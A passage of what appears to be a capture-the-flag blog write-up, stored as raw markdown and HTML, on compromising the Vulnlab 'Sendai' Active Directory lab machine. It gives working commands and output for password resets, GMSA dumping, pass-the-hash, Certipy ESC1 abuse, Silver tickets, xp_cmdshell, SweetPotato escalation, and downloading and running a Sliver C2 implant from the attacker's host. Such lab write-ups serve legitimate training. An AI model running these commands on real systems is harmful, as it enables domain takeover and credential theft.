-password '(CLIFFORD.DAVEY PASSWORD)' -template SendaiComputer -save-old\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Saved old configuration for 'SendaiComputer' to 'SendaiComputer.json'\n[*] Updating certificate template 'SendaiComputer'\n[*] Successfully updated 'SendaiComputer'\n```\n\nNow that the template is vulnerable to ESC1, we can request for a keyfile for the Administrator user.\n\n```\n└─$ certipy-ad req -username 'clifford.davey'@sendai.vl -password '(CLIFFORD.DAVEY PASSWORD)' -template SendaiComputer -ca sendai-DC-CA -target dc.sendai.vl -upn administrator@sendai.vl\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 5\n[*] Got certificate with UPN 'administrator@sendai.vl'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n```\n\n`certipy-ad` will generate a keyfile for us that we can use to obtain a service ticket for this user. We'll use the `auth` tool for this.\n\n```\n└─$ certipy-ad auth -pfx administrator.pfx -username 'Administrator' -domain 'sendai.vl' -dc-ip 10.10.98.227\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@sendai.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106[...snip...]8d087a\n```\n\nNow that we have the NT hash for the Administrator user, we can simply use PTH with `evil-winrm` to authenticate to the machine.\n\n```\n└─$ evil-winrm --ip 10.10.98.227 -u 'Administrator' -H 'cfb106[...snip...]be8d087a'\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat ..\\Desktop\\root.txt\nVL[...snip...]\n```\n\nGiven that we have read the root flag, we have now successfully compromised the machine using this method!\n\n# PrivEsc Method #2 - MSSQL\n\nI was also able to discover another method for privilege escalation on the machine, this attack being through MSSQL. If you'll notice in the `Users` directory, there seems to be another user on the machine.\n\n```\n*Evil-WinRM* PS C:\\users> ls\nDirectory: C:\\users\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         7/18/2023   6:09 AM                Administrator\nd-----          7/6/2024   8:12 PM                mgtsvc$\nd-r---         7/11/2023  12:36 AM                Public\nd-----          7/6/2024   8:05 PM                sqlsvc\n```\n\nThere seems to be a `sqlsvc` account, hinting that there may be an MSSQL service running on this machine. Let's do a `netstat` scan to see if our theory is correct.\n\n```\n*Evil-WinRM* PS C:\\users> netstat -a\nActive Connections\nProto  Local Address          Foreign Address        State\n......\n  TCP    0.0.0.0:1433           dc:0                   LISTENING\n```\n\nAs you can see, an MSSQL service is indeed running on the machine.\n\nWhat's interesting as well is that, during my initial enumeration of the filesystem, I found an interesting file that might hint towards an attack on MSSQL.\n\n```\n*Evil-WinRM* PS C:\\config> ls\nDirectory: C:\\config\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         7/11/2023   5:57 AM             78 .sqlconfig\n\n*Evil-WinRM* PS C:\\config> cat .sqlconfig\nServer=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=[...snip...];\n```\n\nWe seem to have found a configuration file underneath `C:\\config`, which is also hosted as an SMB share - although you won't have access to this share until you get access to `mgtsvc$`.\n\nNow that we have a password for `sqlsvc`, what exactly can we do with this? At this point it would make sense to authenticate to their account using WinRM, however they are not a part of the `Remote Management Operators`. You will notice that they do have an SPN to MSSQL within Bloodhound.\n\n![](/images/vulnlab/sendai-vl/i.png)\n\nAt this point, I immediately thought back to what we had done for [Breach](https://dan-feliciano.com/2024/06/29/breach/). Given that we have the plaintext password for an account that has an SPN set to MSSQL (which seems to be the MSSQL service account), we can potentially exploit a [Silver ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).\n\nWith the silver ticket attack, we can gain command execution access through MSSQL by impersonating the Administrator user. Let's first start up [Sliver C2](https://github.com/BishopFox/sliver) and set up a SOCKS proxy, as the MSSQL service is not externally facing and is behind a firewall (since we didn't see it on our initial NMAP scan).\n\n```\nsliver > mtls\nsliver > generate --mtls (KALI IP) --os windows --arch amd64 --format exe --save (SAVE PATH) --name sendai\n```\n\nLet's then execute the Sliver implant to receive a session on our Sliver server - to which we can start a SOCKS proxy on.\n\n```\n*Evil-WinRM* PS C:\\temp> curl http://10.8.0.173:9001/sendai.exe -O sendai.exe\n*Evil-WinRM* PS C:\\temp> .\\sendai.exe\n\n[*] Session 9976dc7b sendai - 10.10.98.227:60658 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:24:25 EDT\n\nsliver > use 9976dc7b-addd-44c8-9ac1-b8960b009c67\n\n[*] Active session sendai (9976dc7b-addd-44c8-9ac1-b8960b009c67)\n\nsliver (sendai) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081  \n⚠  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nNow that we have a SOCKS proxy running, make sure to update `/etc/proxychains4.conf` at the bottom of the file to reflect the interface (`127.0.0.1`) and the port (`1081`) that the proxy is listening on.\n\nWe can then use `proxychains4` to execute commands through the firewall.\n\n```\n└─$ proxychains4 nmap -sT -p1433 10.10.98.227         \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nNmap scan report for sendai.vl (10.10.98.227)\nHost is up (0.26s latency).\n\nPORT     STATE SERVICE\n1433/tcp open  ms-sql-s\n\nNmap done: 1 IP address (1 host up) scanned in 0.52 seconds\n```\n\nNow that we have access to the MSSQL ticket, we'll need to craft our Silver ticket in order to authenticate as the Administrator user.\n\nIn order to do this, we'll need a few objects relative to domain identification.\n\n* The domain SID - `S-1-5-21-3085872742-570972823-736764132` (Can be found in Bloodhound).\n* The NT Hash of the SQL service account - (Can be crafted using web tools like [this](https://codebeautify.org/ntlm-hash-generator) along with SQLSVC's plaintext password).\n* The SPN our service account has - `MSSQL/dc.sendai.vl`.\n* The name of the user we want to impersonate - Administrator.\n\nPutting this all together, you should receive a command similar to the below.\n\n```\n└─$ proxychains4 impacket-ticketer -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash 58655C0[...snip...]78C2D96A -spn MSSQL/dc.sendai.vl -dc-ip 10.10.98.227 -domain sendai.vl Administrator\n......\n[*] Saving ticket in Administrator.ccache\n```\n\nWe can then set our Kerberos authentication global variable on Kali to be directed to the ticket file that was generated. This will then be followed by our authentication attempt into MSSQL through our proxy.\n\n```\n└─$ export KRB5CCNAME=Administrator.ccache\n\n└─$ proxychains4 impacket-mssqlclient -k dc.sendai.vl\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  dc.sendai.vl:1433  ...  OK\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (SENDAI\\Administrator  dbo@master)> \n```\n\nNow that we are authenticated to MSSQL in the context of Administrator (we still only have the privileges of `SQLSVC`), we can enable command execution using the `enable_xp_cmdshell` tool that comes built into this client.\n\n```\nSQL (SENDAI\\Administrator  dbo@master)> enable_xp_cmdshell\n[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n```\n\nLet's now run `xp_cmdshell` to execute local commands and execute our Sliver implant we put on the filesystem earlier.\n\n```\nSQL (SENDAI\\Administrator  dbo@master)> xp_cmdshell powershell \"cd C:\\temp; .\\sendai.exe\"\n```\n\n![](/images/vulnlab/sendai-vl/j.png)\n\n# PrivEsc Method #2 (cont.) - SeImpersonatePrivilege\n\nNow that we have a session as `SQLSVC`, we'll find that they have `SeImpersonatePrivilege` enabled on their account. I've covered this before, however I'll just give a brief overview as to how it works.\n\n```\nsliver (sendai) > sa-whoami\n\n[*] Successfully executed sa-whoami (coff-loader)\n[*] Got output:\n......\n\nPrivilege Name                Description                                       State                         \n============================= ================================================= ===========================\nSeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      \nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      \nSeMachineAccountPrivilege     Add workstations to domain                        Disabled                      \nSeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       \nSeManageVolumePrivilege       Perform volume maintenance tasks                  Enabled                       \nSeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       \nSeCreateGlobalPrivilege       Create global objects                             Enabled                       \nSeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled\n```\n\nService accounts, by default, will have this privilege along with `SeAssignPrimaryTokenPrivilege`. Having `SeImpersonatePrivilege` essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.\n\nWe can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM. If we direct this towards our implant, we should be able to receive a Sliver session as SYSTEM.\n\nYou can use any binaries within the Potato family for our exploit to force SYSTEM to authenticate to our endpoint. In the past, I've used [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) due to AV restrictions, however that is not the case here as AV is not enabled on this machine. I'll use [SweetPotato](https://github.com/CCob/SweetPotato) in our case, since I already have it compiled with Visual Studio on my machine.\n\nWe can execute this through Sliver's built-in .NET assembly command tools.\n\n```\nsliver (sendai) > execute-assembly SweetPotato.exe '-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\temp\\sendai.exe\" -e EfsRpc'\n\n[*] Output:\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b54f2ec8-c934-40f1-885c-2b715199b7af/\\b54f2ec8-c934-40f1-885c-2b715199b7af\\b54f2ec8-c934-40f1-885c-2b715199b7af\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\n[*] Session 4afdd3a6 sendai - 10.10.98.227:49917 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:47:19 EDT\n```\n\nIf all was done correctly, this should generate a Sliver callback session as SYSTEM as it did for me denoted above. Since we have an account as SYSTEM, we can now essentially control the machine as we'd like. We can dump all of the domain user hashes and secrets, establish persistence through services, etc.\n\nSince we have access as SYSTEM though, we can read the root flag of this machine. This means we have successfully compromised this machine using this method!\n\n```\nsliver (sendai) > cat \"C:\\Users\\Administrator\\Desktop\\root.txt\"\n\nVL[...snip...]\n```\n\n![](/images/vulnlab/sendai-vl/k.png)\n\n# Conclusion\n\nThis machine was an incredible environment that helped me bounce off of tactics that I had actually learned in previous Vulnlab machines. Using ADCS or creating a Silver ticket through MSSQL is something that I've done before, and it was really great to be able to put that same knowledge into this machine. There could potentially be other methods that I am not aware about, but nonetheless I think I'm satisfied with the work that I've done for Sendai.\n\nBig thanks goes out to xct for the development of this machine and for the continued practice with red teaming.\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/dirkjanm/krbrelayx\nhttps://github.com/GhostPack/Seatbelt\nhttps://github.com/itm4n/PrivescCheck\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\nhttps://github.com/GhostPack/Certify\nhttps://github.com/GhostPack/Rubeus\nhttps://github.com/ly4k/Certipy\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\nhttps://github.com/BishopFox/sliver\nhttps://codebeautify.org/ntlm-hash-generator\nhttps://github.com/bugch3ck/SharpEfsPotato\nhttps://github.com/CCob/SweetPotato","slug":"sendai","published":1,"updated":"2024-07-07T05:51:55.883Z","comments":1,"layout":"post","photos":[],"_id":"clyb4ywdi000085uf04zt27em","content":"<p>Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I’ll go over two methods that I was able to perform for both foothold and privilege escalation. I’m guessing that we’ll see many similar tactics to the AD boxes that I’ve completed before.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s first start out with our NMAP scan of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.98.227 </span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 10:53 EDT</span><br><span class=\"line\">Nmap scan report for sendai.vl (10.10.98.227)</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 986 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">443/tcp  open  https</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds</span><br></pre></td></tr></table></figure>\n\n<p>We see a couple ports open such as SMB and LDAP, along with an HTTP server running on port 80.</p>\n<p>The HTTP server seems to be a bare IIS website, meaning there isn’t a direct service that we can exploit at this moment.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/b.png\"></p>\n<p>I ran a <code>gobuster</code> scan against the web service for about a minute to see if there were any directories we could find, though came back with no results that we can access right now.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.98.227 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt </span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://10.10.98.227</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/service              (Status: 301) [Size: 151] [--&gt; http://10.10.98.227/service/]</span><br></pre></td></tr></table></figure>\n\n<p>A <code>/service</code> directory does come back valid, though it does not seem that we currently have access to the page (403 Access Denied). I’ve seen directories like this in my time doing <a href=\"https://dan-feliciano.com/2024/06/05/lustrous/\">Lustrous</a>, which involved using Kerberos authentication to access websites that we previously did not have access to. Since there seems to be no other way to authenticate with user input, I’ll make the guess that this will be part of the attack path later down the line.</p>\n<h1 id=\"Resetting-Expired-Passwords\"><a href=\"#Resetting-Expired-Passwords\" class=\"headerlink\" title=\"Resetting Expired Passwords\"></a>Resetting Expired Passwords</h1><p>Let’s take a look at SMB to see if there are any shares that we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.98.227 -N        </span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">config          Disk      </span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">sendai          Disk      company share</span><br><span class=\"line\">SYSVOL          Disk      Logon server share </span><br><span class=\"line\">Users           Disk</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have access to a few shares, and the SMB login allows null authentication.</p>\n<p>If you do some enumeration into these shares, you’ll notice that we only have access to <code>sendai</code> and <code>Users</code>. The <code>Users</code> share just contains the directories of the <code>Default</code> and <code>Public</code> directories, meaning this specific share is only hosting those User folders within <code>C:\\Users</code> on the remote computer. The <code>sendai</code> share however contains a multitude of folders, specifically containing an interesting file at its root folder.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Tue Jul 18 13:31:04 2023</span><br><span class=\"line\">  ..                                DHS        0  Wed Jul 19 10:11:25 2023</span><br><span class=\"line\">  hr                                  D        0  Tue Jul 11 08:58:19 2023</span><br><span class=\"line\">  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023</span><br><span class=\"line\">  it                                  D        0  Tue Jul 18 09:16:46 2023</span><br><span class=\"line\">  legal                               D        0  Tue Jul 11 08:58:23 2023</span><br><span class=\"line\">  security                            D        0  Tue Jul 18 09:17:35 2023</span><br><span class=\"line\">  transfer                            D        0  Tue Jul 11 09:00:20 2023</span><br><span class=\"line\"></span><br><span class=\"line\">7309822 blocks of size 4096. 604434 blocks available</span><br><span class=\"line\">smb: \\&gt; get incident.txt</span><br><span class=\"line\">getting file \\incident.txt of size 1372 as incident.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/sendai-vl/c.png\"></p>\n<p>It seems as though there is a notice about poor password management&#x2F;usage within the environment, specifically from the domain users. Aside from this, the note also tells us that all users that have had their passwords reset have been expired as of where we are now.</p>\n<p>Given that a few users may have their passwords reset, we can test whether or not any of them have a null password (indicating a user with an expired password). However - we’ll need a user list in order to do so. Luckily enough - since we have null authentication to SMB, we can essentially enumerate all of the domain users using a tool such as <code>lookupsid</code>. This will brute force all of the domain SIDs of all objects within the domain that have a max RID value below 4000(we can increase this RID value, though its not needed for this machine).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-lookupsid sendai.vl/&#x27;temp&#x27;@10.10.98.227 -no-pass -domain-sids | cut -d &#x27;\\&#x27; -f 2 | awk &#x27;NR &gt;= 31 &#123;print $1&#125;&#x27; &gt; full_ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>I’ve done the needful and converted all of the domain users into a wordlist. Let’s now test for any users that have an expired password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.98.227 -u full_ul.txt -p &#x27;&#x27; --continue-on-success</span><br><span class=\"line\">[-] sendai.vl\\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE</span><br><span class=\"line\">[-] sendai.vl\\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE</span><br></pre></td></tr></table></figure>\n\n<p>You’ll receive a few false positives from users such as <code>admsvc</code> or <code>staff</code>, and this is due to the fact that these aren’t legitimate domain users. Since they aren’t domain users, SMB falls back on its null authentication for these usernames - meaning they would work regardless.</p>\n<p>As noted from the code snippet above, it seems as though <code>Elliot.Yates</code> and <code>Thomas.Powell</code> both have their passwords reset.</p>\n<p>We can reset these passwords using Impacket’s built-in <code>smbpasswd</code> tool, which will reset the passwords of the users we give it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbpasswd sendai.vl/&#x27;Elliot.Yates&#x27;@10.10.98.227 -newpass &#x27;Password123@&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">  Warning: This functionality will be deprecated in the next Impacket version  </span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">Current SMB password: </span><br><span class=\"line\">[!] Password is expired, trying to bind with a null session.</span><br><span class=\"line\">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>We can then test the users authentication to LDAP using <code>crackmapexec</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27;              </span><br><span class=\"line\">SMB         10.10.98.227   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227   389    DC               [+] sendai.vl\\Elliot.Yates:Password123@</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a valid user in LDAP, let’s dump the domain using Bloodhound along with its <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;sendai.vl&#x27; -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27; -c all -ns 10.10.98.227 --zip</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MGTSVC-Method-1-LDAP\"><a href=\"#MGTSVC-Method-1-LDAP\" class=\"headerlink\" title=\"MGTSVC Method #1 - LDAP\"></a>MGTSVC Method #1 - LDAP</h1><p>At this point, there are two methods that you can use to get user. The intended path is to go through LDAP in order to escalate privileges, however there is also a web-focused path that I will cover after the intended.</p>\n<p>If you take a look over at Bloodhound, you’ll notice that our user <code>Elliot.Yates</code> has an interesting outbound object control.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/d.png\"></p>\n<p>It seems that we are apart of the <code>Support</code> domain group. Due to us being within the <code>Support</code> domain group, we are automatically given the right to have <code>GenericAll</code> over the <code>admsvc</code> domain group. I’ve had this privilege before, however it’s mainly been on either domain user or domain computers. The difference here is that this privilege is against a group - though it can also allow us to add our current user to that group.</p>\n<p>We can do so by using the default RPC package that comes built-in with Kali. This tool, <code>net rpc</code>, can allow us to modify the domain group and add ourselves to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ net rpc group addmem &quot;admsvc&quot; &quot;Elliot.Yates&quot; -U sendai.vl/&quot;Elliot.Yates&quot;%&quot;Password123@&quot; -S dc.sendai.vl</span><br></pre></td></tr></table></figure>\n\n<p>We can then verify that the change has been made with the same tool.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ net rpc group members &quot;admsvc&quot; -U &quot;sendai.vl&quot;/&quot;Elliot.Yates&quot;%&quot;Password123@&quot; -S dc.sendai.vl</span><br><span class=\"line\">SENDAI\\websvc</span><br><span class=\"line\">SENDAI\\Norman.Baxter</span><br><span class=\"line\">SENDAI\\Elliot.Yates</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were added to the group successfully. Looking into these group members domain privileges, we can see that users within this group has a specific outbound object control as well.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/e.png\"></p>\n<p>Users within the <code>admsvc</code> group have the <code>ReadGMSAPassword</code> over the <code>MGTSVC$</code> account. This privilege allows us to view the Group-Managed Service Account (GMSA) password of the support account, which will return to us the NT hash of the account.</p>\n<p>Crackmapexec has a handle for this, so we can easily do it with <code>Elliot.Yates</code> credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27; --gmsa           </span><br><span class=\"line\">SMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [+] sendai.vl\\Elliot.Yates:Password123@ </span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece1a9[...snip...]a44c1a20</span><br></pre></td></tr></table></figure>\n\n<p>I verified that the <code>MGTSVC$</code> account has WinRM access through Bloodhound, as you can see that it is a part of the <code>Remote Management Users</code> group.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.98.227 -u &#x27;mgtsvc$&#x27; -H &#x27;52ece[...snip...]4c1a20&#x27;</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents&gt; whoami</span><br><span class=\"line\">sendai\\mgtsvc$</span><br></pre></td></tr></table></figure>\n\n<p>This means we have successfully completed the first half of the machine. The first user flag is within <code>C:\\</code>.</p>\n<h1 id=\"MGTSVC-Method-2-WebSVC\"><a href=\"#MGTSVC-Method-2-WebSVC\" class=\"headerlink\" title=\"MGTSVC Method #2 - WebSVC\"></a>MGTSVC Method #2 - WebSVC</h1><p>This second method I discovered, credit goes out to Yeeb for this specific attack path.</p>\n<p>If we run a <code>gobuster</code> scan against the HTTP service, you’ll notice that an interesting endpoint that we can’t see on the main HTTP page of the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster vhost --url https://sendai.vl -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k --exclude-length 334 </span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:              https://sendai.vl</span><br><span class=\"line\">[+] Method:           GET</span><br><span class=\"line\">[+] Threads:          50</span><br><span class=\"line\">[+] Wordlist:         /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class=\"line\">[+] User Agent:       gobuster/3.6</span><br><span class=\"line\">[+] Timeout:          10s</span><br><span class=\"line\">[+] Append Domain:    true</span><br><span class=\"line\">[+] Exclude Length:   334</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in VHOST enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Found: service.sendai.vl Status: 200 [Size: 4189]</span><br></pre></td></tr></table></figure>\n\n<p>Browsing to this subdomain (after editing it into our <code>/etc/hosts</code> file) will lead us to the DownDetector.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/f.png\"></p>\n<p>This website seems to be an internal website scan, which will verify if a subdomain within the environment is experiencing issues. It seems as though this requires no authentication, however its usability can be severe.</p>\n<p>It allows us to prompt a subdomain to check, meaning this website will probably submit an LDAP request to the subdomain that we specify. What’s great is that we actually have the ability to create a fake subdomain due to <code>Elliot.Yates</code> Machine Account Quota (MAQ). This let’s us create a computer account, to which we can use to create an LDAP record of a fake subdomain that points back to our attacker machine. If there is a service account associated with this web service, we can capture their NetNTLMv2 hash using <code>responder</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227    389    DC               [+] sendai.vl\\Elliot.Yates:Password123@ </span><br><span class=\"line\">MAQ         10.10.98.227    389    DC               [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.98.227    389    DC               MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>\n\n<p>It isn’t necessarily needed for us to create a computer account for this attack, as all we need to do is create the fake LDAP record. It is odd though how we have a MAQ of 10, and given that this is what I’m used to doing - I decided to set up a domain computer account anyways.</p>\n<p>Let’s first start with creating the domain computer.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-addcomputer -dc-ip 10.10.98.227 -computer-name daz -computer-pass &#x27;Password123@&#x27; sendai.vl/Elliot.Yates:&#x27;Password123@&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully added machine account daz$ with password Password123@.</span><br></pre></td></tr></table></figure>\n\n<p>We can then use <code>dnstool.py</code> in the <a href=\"https://github.com/dirkjanm/krbrelayx\">KrbRelayX</a> library to create the fake LDAP record, using our new computer account credentials.</p>\n<figure class=\"highlight 